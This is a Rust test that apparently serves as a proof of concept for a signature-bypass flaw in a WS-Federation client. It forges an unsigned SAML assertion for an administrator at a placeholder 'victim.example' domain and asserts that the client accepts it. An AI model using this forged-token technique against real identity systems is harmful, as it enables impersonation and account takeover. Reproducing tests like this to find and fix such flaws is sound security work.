use auth_framework::protocols::ws_federation::{WsFederationClient, WsFederationConfig};

#[test]
fn an_unsigned_hand_written_token_is_accepted() {
    let client = WsFederationClient::new(WsFederationConfig {
        sts_url: "https://adfs.victim.example/adfs/ls".into(),
        realm: "https://app.victim.example".into(),
        reply_url: "https://app.victim.example/auth/wsfed".into(),
        trusted_issuers: vec!["https://adfs.victim.example/adfs/services/trust".into()],
        ..Default::default()
    })
    .unwrap();
    let (_, wctx) = client.sign_in_url().unwrap();
    let now = chrono::Utc::now();
    let rstr = format!(
        r#"<t:RequestSecurityTokenResponse xmlns:t="http://schemas.xmlsoap.org/ws/2005/02/trust"><t:RequestedSecurityToken><saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_x" Version="2.0"><saml:Issuer>https://adfs.victim.example/adfs/services/trust</saml:Issuer><saml:Subject><saml:NameID>admin@victim.example</saml:NameID></saml:Subject><saml:Conditions NotBefore="{}" NotOnOrAfter="{}"><saml:AudienceRestriction><saml:Audience>https://app.victim.example</saml:Audience></saml:AudienceRestriction></saml:Conditions></saml:Assertion></t:RequestedSecurityToken></t:RequestSecurityTokenResponse>"#,
        (now - chrono::Duration::minutes(1)).format("%Y-%m-%dT%H:%M:%SZ"),
        (now + chrono::Duration::minutes(10)).format("%Y-%m-%dT%H:%M:%SZ"),
    );
    let token = client
        .process_sign_in_response("wsignin1.0", &rstr, Some(&wctx), &wctx)
        .unwrap();
    println!("ACCEPTED SUBJECT: {}", token.subject);
    assert_eq!(token.subject, "admin@victim.example");
}
